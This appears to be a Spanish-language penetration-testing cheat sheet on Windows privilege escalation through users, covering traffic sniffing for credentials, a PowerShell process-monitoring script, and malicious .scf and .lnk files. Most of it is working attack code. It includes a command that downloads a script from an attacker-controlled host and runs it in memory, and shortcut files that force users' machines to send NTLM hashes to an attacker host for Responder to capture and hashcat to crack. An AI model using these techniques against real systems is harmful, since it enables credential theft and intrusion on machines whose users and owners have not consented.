# Windows Privilege Escalation – Interacting with Users

Los usuarios pueden ser aprovechados como vector de escalada de privilegios. Estas técnicas implican manipular su interacción con el sistema para obtener credenciales o hashes.

---

## 1. Captura de tráfico (Traffic Capture)

### Descripción
Si Wireshark o Npcap están instalados y mal configurados, es posible capturar tráfico en la máquina y robar credenciales en texto claro o hashes NTLM.

### Pasos

1. **Verificar instalación:**
   - Revisar si existe Wireshark/Npcap en `C:\Program Files\Wireshark\`.

2. **Capturar tráfico en la máquina comprometida:**
   ```powershell
   wireshark
   ```
   - Filtrar por protocolos: `ftp`, `http`, `smtp`.

3. **Analizar credenciales:**
   Ejemplo de tráfico FTP:
   ```
   USER root
   PASS FTP_adm1n!
   ```

4. **Alternativa desde máquina atacante:**
   - Capturar con `tcpdump` o Wireshark.
   - Extraer credenciales automáticamente:
     ```bash
     sudo python3 net-creds.py -i eth0
     # o
     sudo python3 net-creds.py -p captura.pcap
     ```

---

## 2. Monitoreo de líneas de comandos de procesos

### Descripción
Detectar credenciales pasadas como argumentos en procesos (`net use`, tareas programadas).

### Pasos

1. **Script en PowerShell para monitorear:**  
   ```powershell
   while($true) {
     $process = Get-WmiObject Win32_Process | Select-Object CommandLine
     Start-Sleep 1
     $process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
     Compare-Object -ReferenceObject $process -DifferenceObject $process2
   }
   ```


2. **Ejecutar el script en la máquina víctima, obteniéndolo por ejemplo desde la máquina atacante creando servidor web simple:**
   ```powershell
   IEX (iwr 'http://<IP_atacante>/procmon.ps1')
   ```

3. **Ejemplo encontrado:**
   ```
   net use T: \\sql02\backups /user:dominio\sqlsvc My4dm1nP@s5w0Rd
   ```

4. **Usar credenciales descubiertas:**
   ```powershell
   net use T: \\sql02\backups /user:dominio\sqlsvc My4dm1nP@s5w0Rd
   ```

---

## 3. SCF malicioso en shares

### Descripción
Archivos `.scf` manipulados provocan autenticación SMB al acceder a la carpeta.

### Pasos

1. **Crear archivo malicioso:**
   Guardar como `@Inventory.scf`:
   ```ini
   [Shell]
   Command=2
   IconFile=\\<IP_atacante>\share\legit.ico
   [Taskbar]
   Command=ToggleDesktop
   ```

2. **Colocarlo en share accesible.**

3. **Ejecutar Responder para capturar hashes:**
   ```bash
   sudo responder -wrf -v -I tun0
   ```

4. **Crackear hash con Hashcat:**
   ```bash
   hashcat -m 5600 hash.txt /usr/share/wordlists/rockyou.txt
   ```

---

## 4. Archivos `.lnk` maliciosos (para Server 2019+)

### Descripción
Alternativa a SCF cuando ya no funcionan en Server 2019 y posteriores.

### Pasos

1. **Generar `.lnk` malicioso con PowerShell:**
   ```powershell
   $objShell = New-Object -ComObject WScript.Shell
   $lnk = $objShell.CreateShortcut("C:\legit.lnk")
   $lnk.TargetPath = "\\<IP_atacante>\@pwn.png"
   $lnk.WindowStyle = 1
   $lnk.IconLocation = "%windir%\system32\shell32.dll, 3"
   $lnk.Description = "Browse to trigger auth request"
   $lnk.HotKey = "Ctrl+Alt+O"
   $lnk.Save()
   ```

2. **Colocar el `.lnk` en un share usado por usuarios.**

3. **Capturar hashes con Responder/Inveigh.**

